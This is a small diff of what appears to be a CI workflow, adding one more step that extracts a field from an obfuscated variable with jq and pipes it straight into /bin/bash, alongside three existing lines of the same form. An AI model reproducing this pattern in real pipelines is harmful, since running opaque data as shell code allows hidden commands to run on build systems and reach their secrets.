@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$m386" | jq -r .velf67054 | /bin/bash
           echo $mfzw223 | jq -r .q34 | /bin/bash
           printf '%s' "$tydx6" | jq -r .whh3 | /bin/bash
+          echo $ju52 | jq -r .r738 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
